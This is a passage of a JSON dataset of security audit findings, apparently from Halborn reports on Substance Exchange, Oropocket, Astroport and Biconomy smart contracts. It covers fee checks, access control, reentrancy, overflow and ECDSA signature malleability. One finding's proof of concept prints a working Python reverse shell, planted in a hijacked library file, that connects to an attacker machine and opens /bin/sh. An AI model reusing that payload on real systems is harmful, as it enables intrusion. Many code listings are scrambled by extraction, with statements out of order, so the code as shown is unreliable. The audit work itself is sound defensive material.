        "body": "The StakingReward contract uses the ERC721A standard to store the users ERC721A is designed to staking weight and the corresponding rewards. allow multiple mints at the same time with so-called batch transfers (the more tokens minted at the same time, the more gas efficient the operation is) and Substance Exchange is not implementing this core functionality in their protocol. In ERC721A, NFT transfers are more expensive because of the way NFT owner accounts are stored. Code Location: StakingReward.sol#L21 Listing 9: StakingReward.sol 21 contract StakingReward is Ownable , Delegatable , ERC721A { Proof of Concept: For the purposes of this PoC, two different types of NFTs were created, one based on the ERC721A standard and one based on ERC721. 35 constructor () ERC721A ( \" Substance Exchange Stake Azuki \" , \" Listing 10: HalbornERC721A.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.17; 3 4 import \" ../ lib / erc721a / contracts / ERC721A . sol \" ; 5 6 contract HalbornERC721A is ERC721A { 7 8  SEXSTAKE \" ) {} 9 10 11 12 13 14 15 16 17 } _mint ( msg . sender , _quantity ); transferFrom ( msg . sender , _to , tokenId ); } } function mint ( uint256 _quantity ) external payable { function transfer ( address _to , uint256 tokenId ) external { Listing 11: HalbornERC721.sol constructor () ERC721 ( \" Substance Exchange Stake OZ \" , \" SEXSTAKE \" 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.17; 3 4 import \" ../ lib / openzeppelin - contracts / contracts / token / ERC721 /  ERC721 . sol \" ; 5 6 contract HalbornERC721 is ERC721 { 7 8  ) {} 9 10 11 12 13 14 15 16 17 } function transfer ( address _to , uint256 _tokenId ) public { function mint ( uint256 _tokenId ) public { _transfer ( msg . sender , _to , _tokenId ); _mint ( msg . sender , _tokenId ); } } 36 The following scenario was simulated:  Minting an ERC721 (ozNFT) with tokenId = 0  Minting an ERC721A (azukiNFT) with quantity param = 1  Transfer the ozNFT (tokenId = 0) from Alice to Bobby  Transfer the azukiNFT (tokenId = 0) from Alice to Bobby Scenario ozNFT mint azukiNFT mint ozNFT transfer azukiNFT transfer Gas consumed 47081 68824 22400 27817 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:P/S:U (1.2) Recommendation: It is recommended to use the standard ERC721 from Openzeppelin instead of ERC721A for the StakingRewards if only one NFT is processed at a time. 37 Reference: The ERC721A specification can be reviewed here and a detailed comparison with the ERC721 standard is available here. Remediation Plan: SOLVED: The Substance Exchange team solved this issue by replacing the ERC721A standard with ERC721 in commit e45003fe. 38 ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING FEE RATES SANITY CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The exchange charges handling fees on certain operations. Fee rates are set by the contract owner and can be updated anytime. None of the setter functions does the sanity check of the provided fee rates, which may lead to contract owners introducing prohibitive or zero fees accidentally or by design. Code Location: SubstanceUSD.sol#L54 Listing 12: SubstanceUSD.sol function setFee ( uint256 _mintFee , uint256 _burnFee ) external 54  onlyOwner { 55 56 57 } mintFee = _mintFee ; burnFee = _burnFee ; SwapManager.sol#L45 Listing 13: SwapManager.sol function setMinExecutionFee ( uint256 _minExecutionFee ) external 45  onlyOwner { 46 47 } minExecutionFee = _minExecutionFee ; OptionManager.sol#L59 Listing 14: OptionManager.sol function setMinExecutionFee ( uint256 _minExecutionFee ) external 45  onlyOwner { 39 46 47 } minExecutionFee = _minExecutionFee ; BaseFuture.sol#L167 Listing 15: BaseFuture.sol 167 function setMinExecutionFee ( uint256 _minExecutionFee ) external  onlyOwner { minExecutionFee = _minExecutionFee ; 168 169 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:L/D:N/Y:L/R:F/S:U (0.2) Recommendation: It is recommended to restrict the fee rates to fixed ranges. Remediation Plan: ACKNOWLEDGED: The Substance Exchange team acknowledged this issue. 40 RETESTING 41 The issue described in this section was brought to Halborns attention by the Substance Exchange team during the engagement. 5.1 SUBSTANCE01 - USERS CAN OPEN FUTURE POSITIONS WITHOUT PROVIDING THE COLLATERAL ACCORDINGLY ",
        "labels": [
            "Halborn",
            "Substance_Exchange_Exchange_V1",
            "Severity: Informational"
        ]
    },
    {
        "title": "ACCESS CONTROL POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf",
        "body": "In smart contracts, implementing a correct Access Control policy is es- sential to maintain security and decentralization of permissions on a token. The features to mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to keep the prin- ciple of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in simple systems, but more complex projects require the use of more roles using Role-based access control. Therefore, there could be multiple roles such as moderator, minter, admin, or pauser. In both XTZGold and XTZSilver contracts, administrator is only one privi- leged role. Administrator can mint tokens, approving transactions, burn- ing other users token, pausing/unpausing the contract, making transfers while the contract is on pause. In conclusion, administrator role can do too many actions in both contracts. So, if the private key of the admin- istrator account is stolen, the attacker can perform many actions such as minting/burning tokens or approving transactions without following the principle of least privilege. Code Location: XTZGold Line #7-8 XTZSilver Line #7-8 13 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles; at minimum the roles of ADMIN, MINTER and PAUSER. Reference: https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: After review of the findings and associated risks, the Oropocket team decided that the current access control policy is proper, and will leave the single Admin role access control policy that exists presently. 14 ",
        "labels": [
            "Halborn",
            "Tezos_Oropocket_Final",
            "Severity: Medium"
        ]
    },
    {
        "title": "HIJACKING PYTHON LIBRARY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf",
        "body": "In general, Python doesnt check the legitimacy of a library when a script imports it. In this case, XTZGold and XTZSilver Smart Contracts start by importing the smartpy library. If smartpy library is hijacked by an attacker, some actions can be triggered such as getting a reverse shell either as user or root if the library is imported with sudo permissions. In the following Proof of Concept (PoC), it is assumed the system has been already compromised. This methodology is known as Assumed Breach Methodology. Reference: https://www.netsurion.com/articles/the-assume-breach- paradigm Proof of Concept: An Ubuntu VM and a Kali Linux VM (IP Address: 192.168.1.101) are used in this PoC. 1. An attacker replaces the __init__.py file $HOME/.local/lib/python3.8/site-packages/smartpy/ custom script to get a reverse shell: located for in a import socket import subprocess import os s= socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s. connect (( \" 192.168.1.101 \" ,1337) ) os . dup2 ( s. fileno () ,0) 15 os . dup2 ( s. fileno () ,1) os . dup2 ( s. fileno () ,2) p= subprocess . call ([ \" / bin / sh \" ,\" -i\" ]) 2. In a terminal in Kali Linux, a netcat is listening in port 1337. 3. smartpy library is imported. 4. A new shell is received in Kali Linux VM. 5. The same thing if you run Python as root, but a root shell is received. 16 Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is important to check if libraries are updated at the moment python scripts are tested locally. Although the breach is assumed in this vulnerability, it is a good practice to reinstall (--force flag) the library before running a python script or interpreter in order to be sure that the library version is correct and legit. Secondly, testing smart contracts in SmartPy IDE web avoid this vulnerability. In SmartPy IDE, libraries are locally stored and they are regularly checked and updated. Remediation Plan: Oropocket team will use the SmartPy IDE to compile and deploy the smart contracts to avoid potential library vulnerabilities. 17 ",
        "labels": [
            "Halborn",
            "Tezos_Oropocket_Final",
            "Severity: Low"
        ]
    },
    {
        "title": "MINTING CAP NOT DEFINED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf",
        "body": "Smart Contract which can mint and burn tokens usually define how many tokens they want to mint. It is also know as cap and is defined in the constructor. Code Location: XTZGold Line #7-8 XTZSilver Line #7-8 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to define how many tokens to mint in the constructor. Remediation Plan: Oropocket team accepts the current unlimited Minting cap that is presently used. 18 ",
        "labels": [
            "Halborn",
            "Tezos_Oropocket_Final",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOCK MINTING FUNCTION NOT DECLARED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf",
        "body": "In Python Smart Contracts developed by SmartPy, it is possible to prevent any new tokens from being minted using a LockMinting function. With this function, even the administrator role cannot mint tokens. Risk Level: Likelihood - 1 Impact - 2 Recommendation: Implementing a LockMinting function, it is possible to prevent any new tokens from being minted. It makes more sense using this function if a Role-based access control is implemented, so it is a way to control the minting of tokens of the MINTER_ROLE by the admin. Remediation Plan: Oropocket team doesnt consider it necessary to declare a lock minting function with the current design in the role and access control policies. 19 3.5 MANUAL TESTING REPORT ",
        "labels": [
            "Halborn",
            "Tezos_Oropocket_Final",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF VALIDATION UPON BRIDGE REMOVAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "AssetInfo instances do not normalize capitalization, taking as different assets ULUNA and uluna. When using the update_bridges function to remove bridges, if a different capitalization was used on the elements of the remove parameter the operation resulted in no modifications being done without the sender receiving any error feedback, as those wont be found in the current list of bridges. In case the owner unwillingly included incorrect assets to remove the bridge, the undesired bridge would still be available to perform token swapping by the contract, potentially affecting the contracts toke- nomics. Code Location: Listing 1: contracts/tokenomics/maker/src/contract.rs (Line 688) 685 686 687 688 689 690 // remove old bridges if let Some ( remove_bridges ) = remove { for asset in remove_bridges { BRIDGES . remove ( deps . storage , asset . to_string () ); } } Risk Level: Likelihood - 2 Impact - 3 12 Recommendation: Validate the assets provided in the remove parameter to ensure that all In addition, an error could be of them follow proper capitalization. raised if the asset to be removed if they are not found on the BRIDGES state variable. Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit b7fa67c4d2429e61139331717639cd8f50cb1629. 13 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Maker_Contract_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MISUSE OF HELPER METHODS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of the unwrap function is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option does not have Some value or Result. Nevertheless, leaving unwrap functions in production environments is a bad practice because not only will this cause the program to crash out, or panic!, but also no helpful messages are shown to help the user solve or understand the reason of the error. Code Location: Listing 2: Affected resources 1 contracts / tokenomics / maker / src / contract . rs :801: let ( asset , bridge ) = item . unwrap () ; 2 contracts / tokenomics / maker / src / contract . rs :802: ( String :: from_utf8 ( asset ). unwrap () , bridge . to_string () ) Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to avoid the use of unwrap or expect functions in production environments as it could cause a panic!, crashing the con- tract without error messages. Some alternatives are possible, such as propagating the error by putting a \"?\", using unwrap_or / unwrap_or_else / unwrap_or_default functions, or using error-chain crate for errors 14 Reference: https://crates.io/crates/error-chain Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit b7fa67c4d2429e61139331717639cd8f50cb1629. 15 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Maker_Contract_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNCHECKED MATH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In computer programming, an overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. This issue has been raised as informational only, as it was not possible to define a clear exploitation scenario. However, the affected lines resembled potentially risky patterns and therefore has been highlighted for consideration. Code Location: Listing 3: Affected resources 1 contracts / tokenomics / maker / src / contract . rs :520: Uint128 :: from ( blocks_passed ) * astro_distribution_portion , 2 contracts / tokenomics / maker / src / contract . rs :525: amount -= remainder_reward ; 3 contracts / tokenomics / maker / src / contract . rs :529: amount += current_preupgrade_distribution ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the release mode, Rust does not panic on overflows and overflown values just wrap without any explicit feedback to the user. It is rec- ommended then to use vetted safe math libraries for arithmetic operations 16 Consider replacing consistently throughout the smart contract system. the addition operator with Rusts checked_add method, the subtraction operator with Rusts checked_subs method, and so on. Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit b7fa67c4d2429e61139331717639cd8f50cb1629. 17 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Maker_Contract_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "OVERFLOW CHECKS NOT SET FOR PROFILE RELEASE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "While the overflow-checks parameter is set to true in profile.release and implicitly applied to all contracts and packages from in workspace, it is not explicitly enabled in Cargo.toml file for each individual package, which could lead to unexpected consequences if the project is refactored. Code Location: Listing 4: Affected resources 1 contracts / tokenomics / maker / Cargo . toml Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to enable overflow checks explicitly in each individual contract and package. That measure helps when the project is refactored to prevent unintended consequences. Remediation plan: ACKNOWLEDGED: Astroport acknowledged this finding. 18 ",
        "labels": [
            "Halborn",
            "Astroport_fi_Maker_Contract_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "VULNERABLE ECDSA LIBRARY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A vulnerability found in the ECDSA library developed by the OpenZeppelin team. OpenZeppelin team published a security advisory on GitHub on August 22nd, 2022. According to the vulnerability, recover and tryRecover functions are vulnerable, as those functions accept the standard signature format and compact signature format. (EIP-2098) The functions ECDSA.recover and ECDSA.tryRecover are vulnerable to some sort of signature malleability because they accept compact EIP- 2098 signatures in addition to the traditional 65-byte signature format. This is only an issue for the functions that take a single byte argument, and not the functions that take r, v, s or r, vs as separate arguments. Potentially affected contracts are those that implement signature reuse or replay protection by marking the signature itself as used, rather than the signed message or a nonce included in it. A user can take a signature that has already been submitted, submit it again in a different form, and bypass this protection. Affected Versions >= 4.1.0 < 4.7.3 It was observed that Biconomy contracts were using the vulnerable ECDSA library to recover signatures. 14 Reference: ECDSA Signature Malleability Code Location: Listing 1: package.json (Line 58) 58 \" @openzeppelin / contracts \" : \" ^4.2.0 \" , 59 \" @openzeppelin / contracts - upgradeable \" : \" ^4.7.3 \" , Proof of Concept: The PoC code below proofs that both signatures addresses the same address, as they are identical but in different formats. Listing 2: ECDSA vulnerability test case - PoC UserOperation memory userOp = UserOperation ({ new bytes (0 x0 ) , new bytes (0 x0 ) , sender : user1 , nonce : 0, initCode : callData : callGasLimit : 0, verificationGasLimit : 0 , preVerificationGas : 0, maxFeePerGas : 0, maxPriorityFeePerGas : 0 , paymasterAndData : new bytes (0 x0 ) , signature : new bytes (0 x0 ) 1 function testValidateUserOpPaymaster () public { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  toEthSignedMessageHash () ); 20 21  signature ); }) ; bytes32 hash = paymentMasterNew . getHash ( userOp ); ( uint8 v , bytes32 r , bytes32 s) = vm . sign (101 , hash . bytes memory signature = abi . encodePacked (r , s , v ); bytes memory paymasterAndData = abi . encodePacked ( user1 , 15 userOp . paymasterAndData = paymasterAndData ; paymentMasterNew . validatePaymasterUserOp ( userOp , bytes32 ( // standart sig : 0 xe34 ... b2a0a094 ...6 c1c // short sig ( to2098format ) : 0 xe34 ... baa0a094 ...6 c 22 23 24 25  uint256 (1) ) , 0) ; // standart signature 26 27 28 29 30  e3402d57abf681838763887091f7d4f bb52 cd03 073a375dd010a1dd0e251f87baa0a0948e6a3579f7b88876286d372aaaf46f2af8e4db9a2a59845130d174a6c  \" ; 31 32 33 34 35 36  uint256 (1) ) , 0) ; // same signature ( eip2098 format ) 37 paymentMasterNew . validatePaymasterUserOp ( userOp , bytes32 ( paymasterAndData = abi . encodePacked ( user1 , shortSig2098 ); userOp . paymasterAndData = paymasterAndData ; bytes memory shortSig2098 = hex \" } Risk Level: Likelihood - 4 Impact - 4 Recommendation: It is suggested to update the version of the @openzeppelin/contracts package version to 4.7.3 to fix this finding. 16 Remediation Plan: SOLVED: @openzeppelin/contracts package version to 4.7.3. Biconomy team solved this The finding Commit ID: b813a60a8475672c2a2d00b7ef5d1839461eaa3e by upgrading the 17 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: High"
        ]
    },
    {
        "title": "MISSING REENTRANCY GUARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. It is also suggested to use call.value method with any Reentrancy pro- tection. Code Location: Listing 3: Functions with missing Reentrancy Guard 1 SmartWallet : handlePayment () 2 SmartWallet : transfer () 3 SmartWalletNoAuth : handlePayment () 4 SmartWalletNoAuth : transfer () 5 EntryPoint : innerHandleOp () 6 StakeManager : withdrawStake () 7 StakeManager : withdrawTo () 8 SimpleWallet : addDeposit () Risk Level: Likelihood - 3 Impact - 2 18 Recommendation: The functions in the code location section are missing nonReentrant modifiers. It is recommended to add the necessary nonReentrant modifier to prevent the introduction of future re-entrancy vulnerabilities. Remediation Plan: PARTIALLY SOLVED: The Biconomy team solved this finding by implementing nonReentrant modifiers to functions in the Code Location section. This finding will not be fixed for Account Abstraction Core contracts, as they are templates. Commit ID: 8624fcf9a92a006a2fc6bad7bb9f834ab3641ffe 19 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE INTEGER OVERFLOWS DUE TO IMPROPER USE OF UNCHECKED KEYWORD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "As of version 0.8.0 in Solidity, a control mechanism was implemented to prevent overflow and underflow issues for mathematical operations. Since this costs extra gas, the unchecked keyword was also implemented to remove this extra control mechanism for specific code locations. This keyword should be used with caution to benefit from gas consumption. Otherwise, overflows/underflows for mathematical operations can occur. Code Location: Listing 4: EntryPoint.sol (Line 264) 259 function _getRequiredPrefund ( MemoryUserOp memory mUserOp ) internal  view returns ( uint256 requiredPrefund ) { 260 261 unchecked { // when using a Paymaster , the verificationGasLimit is used  also to as a limit for the postOp call . 262 263 264 // our security model might call postOp eventually twice uint256 mul = mUserOp . paymaster != address (0) ? 3 : 1; uint256 requiredGas = mUserOp . callGasLimit + mUserOp .  verificationGasLimit * mul + mUserOp . preVerificationGas ; 265 266 267  ; 268 } // TODO : copy logic of gasPrice ? requiredPrefund = requiredGas * getUserOpGasPrice ( mUserOp ) Listing 5: EntryPoint.sol (Line 455) 442 function _handlePostOp ( uint256 opIndex , IPaymaster . PostOpMode mode  , UserOpInfo memory opInfo , bytes memory context , uint256  actualGas ) private returns ( uint256 actualGasCost ) { 20 443 444 445 446 447 448 449 450 451 452 453 454 455 456  { 457 uint256 preGas = gasleft () ; unchecked { address refundAddress ; MemoryUserOp memory mUserOp = opInfo . mUserOp ; uint256 gasPrice = getUserOpGasPrice ( mUserOp ); address paymaster = mUserOp . paymaster ; if ( paymaster == address (0) ) { refundAddress = mUserOp . sender ; } else { refundAddress = paymaster ; if ( context . length > 0) { actualGasCost = actualGas * gasPrice ; if ( mode != IPaymaster . PostOpMode . postOpReverted ) IPaymaster ( paymaster ). postOp { gas : mUserOp .  verificationGasLimit }( mode , context , actualGasCost ); 458 459 460 } else { // solhint - disable - next - line no - empty - blocks try IPaymaster ( paymaster ). postOp { gas : mUserOp  . verificationGasLimit }( mode , context , actualGasCost ) {} catch Error ( string memory reason ) { revert FailedOp ( opIndex , paymaster , reason } catch { revert FailedOp ( opIndex , paymaster , \" 461 462  ); 463 464 465  postOp revert \" ); 466 467 468 469 } } } } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider removing unchecked keyword for the multiply operations above. 21 Remediation Plan: SOLVED: The Biconomy team solved this finding by removing the unchecked keywords directly from the above functions. That eliminates the risk of overflow. Commit ID: e3080c259a580b3ddc205776a2aeca999850b0c0 22 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "SINGLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "A two-step procedure for changing roles in the contract is missing. If the address is incorrect, the new address will assume the functionality of the new role directly. There is no way to recover these roles back after these types of errors. Code Location: Listing 6: SmartWallet.sol (Line 103) 100 function setOwner ( address _newOwner ) external mixedAuth { 101 require ( _newOwner != address (0) , \" Smart Account :: new  Signatory address cannot be zero \"); 102 103 104 105 } address oldOwner = owner ; owner = _newOwner ; emit EOAChanged ( address ( this ) , oldOwner , _newOwner ); Listing 7: SmartWalletNoAuth.sol (Line 103) 100 function setOwner ( address _newOwner ) external mixedAuth { 101 require ( _newOwner != address (0) , \" Smart Account :: new  Signatory address cannot be zero \"); 102 103 104 105 } address oldOwner = owner ; owner = _newOwner ; emit EOAChanged ( address ( this ) , oldOwner , _newOwner ); Listing 8: BasePaymaster.sol (Line 63) 61 function _transferOwnership ( address newOwner ) internal virtual { 62 63 64 address oldOwner = owner ; owner = newOwner ; emit OwnershipTransferred ( oldOwner , newOwner ); 23 65 } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is suggested to add two-step ownership change for the specified con- tracts above. Remediation Plan: RISK ACCEPTED: The Biconomy team accepted the risk of this finding. It has been decided to continue with the one-step ownership change pattern. 24 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "These functions are missing address validations. Biconomy Smart Wallet contracts have address fields in multiple func- tions. Each address should be validated and checked to be non-zero. This is also considered a best practice. During testing, it has been found that some of these inputs are not protected against using address(0) as the destination address. Code Location: Listing 9: Missing zero address checks - Variables 1 StakeManager . withdrawStake ( address ). withdrawAddress 2 StakeManager . withdrawTo ( address , uint256 ). withdrawAddress 3 VerifyingPaymasterFactory . deployVerifyingPaymaster ( address , address  , IEntryPoint ). owner 4 VerifyingPaymasterFactory . deployVerifyingPaymaster ( address , address  , IEntryPoint ). verifyingSigner 5 VerifyingPaymaster . init ( IEntryPoint , address , address ).  _verifyingSigner 6 VerifyingPaymaster . init ( IEntryPoint , address , address ). _owner 7 VerifyingPaymaster . setSigner ( address ). _newVerifyingSigner 8 VerifyingPaymaster . init ( IEntryPoint , address , address ).  _verifyingSigner 9 VerifyingPaymaster . init ( IEntryPoint , address , address ). _owner 10 VerifyingPaymaster . setSigner ( address ). _newVerifyingSigner 11 StakeManager . withdrawStake ( address ). withdrawAddress 12 StakeManager . withdrawTo ( address , uint256 ). withdrawAddress 13 BasePaymaster . setEntryPoint ( IEntryPoint ). _entryPoint 25 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to validate that each address input is non-zero. Remediation Plan: SOLVED: The Biconomy team solved this finding by adding require checks to prevent the use of zero addresses. Commit ID: 10d3933d5b9a461b85aebb9343e92ed94ac74970 26 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The requiredTxGas function was declared to return uint256 as a return variable after a successful call. That function calls execute() function, and that function was designed to return bool, not uint256. Therefore, it does not return any variables at all. It is important to validate these return variables. In this case, calling these functions can break any integrations or composability. Code Location: Listing 10: SmartWalletNoAuth.sol (Line 362) 357 function requiredTxGas ( 358 359 360 361 362 363 address to , uint256 value , bytes calldata data , Enum . Operation operation ) external returns ( uint256 ) { // We don 't provide an error message here , as we use it to  return the estimate 364 365 } require ( execute (to , value , data , operation , gasleft () )); Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider returning an uint256 value for the function above. 27 Remediation Plan: SOLVED: The Biconomy team solved this finding by removing the return variable from the requiredTxGas function. Commit ID: 508c44ed749f7c4b06e704d6f6b4e13db9099634 28 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have Locking the pragma helps to ensure that been tested with thoroughly. contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. During the audit, it has seen all contracts use ^0.8.0 as pragma version. Risk Level: Likelihood - 2 Impact - 1 Recommendation: Consider locking the pragma version with known bugs for the compiler version by removing the caret (^) symbol. When possible, do not use floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. 29 Remediation Plan: SOLVED: This finding was solved by updating the Solidity version from ^0.8.0 to 0.8.12. All caret symbols have been removed from these con- tracts. Commit ID: 3b882439d3981db3b1c992fefa18e4b0f80746d4 30 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Informational"
        ]
    },
    {
        "title": "FOR LOOPS CAN BE OPTIMIZED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been observed all for loops in the protocol were not optimized properly. Having not optimized for loops can cost too much gas usage. These for loops can be optimized with suggestions above: 1. In Solidity (pragma 0.8.0 and later), adding unchecked keyword for arithmetical operations can reduce gas usage on contracts where underflow/underflow is unrealistic. It is possible to save gas by using this keyword on multiple code locations. 2. In all for loops, the index variable is incremented using +=. It is known that, in loops, using ++i costs less gas per iteration than +=. This also affects incremented variables within the loop code block. 3. Do not initialize index variables with 0, Solidity already initial- izes these uint variables as zero. Check the Recommendation section for further details. Code Location: Listing 11: Optimizable For Loops - LoC list 1 core / EntryPoint . sol : # L81 2 core / EntryPoint . sol : # L87 3 core / EntryPoint . sol : # L107 4 core / EntryPoint . sol : # L119 5 core / EntryPoint . sol : # L140 31 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to apply the following pattern for Solidity pragma version 0.8.0 and later. Listing 12: Possible Suggestion . . . unchecked { 1 for ( uint256 i ; i < arrayLength ; ) { 2 3 4 5 ++ i } Remediation Plan: SOLVED: The Biconomy team solved the issue by optimizing these for loops as per the suggestion above. Commit ID: 0dc8ee23591fd54318abdd8d892ab84958847cd0 32 ",
        "labels": [
            "Halborn",
            "Biconomy_Smart_Wallet_Contracts_V2",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE DECLARED FUNCTION INSTEAD OF MSG.SENDER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Smart_Wallet_Contracts_V2_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
